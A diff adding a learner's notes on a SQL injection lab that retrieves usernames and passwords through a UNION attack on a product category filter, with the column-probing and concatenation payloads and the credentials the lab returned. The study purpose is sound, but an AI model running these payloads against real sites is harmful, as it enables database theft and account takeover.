@@ -1,0 +1,48 @@
+lab# 6  - SQL injection union attack, retrieving multiple values in a single column
+
+vulnerability: in the producct catgory filter
+
+GOAL: use union attack to retrieve all usrsnmaes and passwords , and use the info to log into the adminn user account.
+
+
+methods/analysis:
+
+1- detrmine how many columns the database has....
+
+'order by 1-- > not displayed on the page.
+'order by 2-- > displayed  on the page.
+'oreder by 3 --> internal server error > columns dosent exist.
+3-1 =2
+
+the dataabase has 2 columns
+
+2- Find which columns has text-type string.. 
+
+' union select null,'a'-- >> no error 2nd col has string type/text.
+' union select 'a','a'-- >>error 1st columns isnt string type of data 
+so 2nd columnns has string type of data
+
+3- output data from other table.
+
+' UNION SELECT NULL, username from users--
+' UNION SELECT NULL, password  from users--
+
+since we want  to retrive data from signle colums we use the concatinate operator asa follow:
+
+' UNION SELECT NULL, username||'~'|| password from users--
+
+we determine the first column to NULL, and concatenate the username&password in the the second col 
+
+
+list of username&password:
+
+administrator~sa3bjoycbkyrjbqqwclr
+Gym Suit
+	
+The Splash
+	
+wiener~z9t7kqggdi4ty8jbcs6w
+Paint a rainbow
+	
+carlos~jetehr5q769oykvsb32a
+Hitch A Lift
